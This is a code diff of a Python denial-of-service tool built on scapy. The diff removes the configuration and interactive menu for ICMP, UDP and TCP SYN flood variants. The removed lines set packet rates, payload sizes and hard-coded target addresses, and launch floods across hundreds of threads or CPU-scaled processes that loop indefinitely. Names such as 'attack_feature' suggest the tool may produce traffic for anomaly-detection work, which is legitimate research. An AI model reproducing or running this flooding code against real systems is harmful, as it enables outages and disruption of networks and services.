@@ -2,29 +2,6 @@ import os
 import socket
 import struct
 import threading
-import time
-import random
-import ipaddress
-import multiprocessing
-from scapy.all import IP, ICMP, UDP, TCP, send
-
-# ============================================================
-# CONFIGURATIONS (unchanged from your scripts)
-# ============================================================
-# ICMP
-DEFAULT_PPS_ICMP = 7000
-STANDARD_PAYLOAD_SIZE_ICMP = 1260
-
-# UDP
-DEFAULT_TARGET_UDP = random.choice(["192.169.0.33", "172.19.0.33"])
-DEFAULT_PORT_UDP = 80
-LARGE_PAYLOAD_SIZE_UDP = 1400
-STANDARD_PAYLOAD_SIZE_UDP = 512
-MAX_THREADS_UDP = 200
-
-# TCP
-TARGET_IP_TCP = random.choice(["192.169.0.33", "172.19.0.33"])
-TARGET_PORT_TCP = 80
 
 # ============================================================
 # ICMP FLOOD FUNCTIONS (from 3rd script)
@@ -333,59 +310,3 @@ ICMP Flood Variants:
     elif proto == '2':
         target_ip = DEFAULT_TARGET_UDP
         print("""
-UDP Flood Variants:
-1. Fixed-Port UDP Flood
-2. Random Destination Port UDP Flood
-3. Large Payload UDP Flood
-4. Mixed Anomaly UDP Flood
-""")
-        choice = input("Choose variant (1-4): ").strip()
-        if choice == '1':
-            fixed_port_udp_flood(target_ip, 6000)
-        elif choice == '2':
-            random_port_udp_flood(target_ip, 1150)
-        elif choice == '3':
-            large_payload_udp_flood(target_ip, 3000)
-        elif choice == '4':
-            mixed_udp_flood(target_ip, 3000)
-        else:
-            print("❌ Invalid choice")
-            exit(1)
-
-    elif proto == '3':
-        print("""
-TCP SYN Flood Variants:
-1. High PPS SYN Flood
-2. High Unique Src Ports SYN Flood
-3. Low Avg Packet Size SYN Flood (High Speed Burst)
-4. Mixed SYN Flood
-""")
-        choice = input("Choose variant (1-4): ").strip()
-        if choice == '1':
-            procs = []
-            for _ in range(multiprocessing.cpu_count() * 5):
-                p = multiprocessing.Process(target=attack_feature1_high_pps_fixed_port, args=(200,))
-                p.daemon = True
-                p.start()
-                procs.append(p)
-        elif choice == '2':
-            for _ in range(200):
-                threading.Thread(target=attack_feature2_unique_ports_high_rate, daemon=True).start()
-        elif choice == '3':
-            procs = []
-            for _ in range(multiprocessing.cpu_count() * 6):
-                p = multiprocessing.Process(target=attack_feature3_low_packet_size_burst, args=(2000, 50))
-                p.daemon = True
-                p.start()
-                procs.append(p)
-        elif choice == '4':
-            attack_feature4_mixed_all()
-        else:
-            print("❌ Invalid choice")
-            exit(1)
-    else:
-        print("❌ Invalid protocol choice")
-        exit(1)
-
-    while True:
-        time.sleep(1)
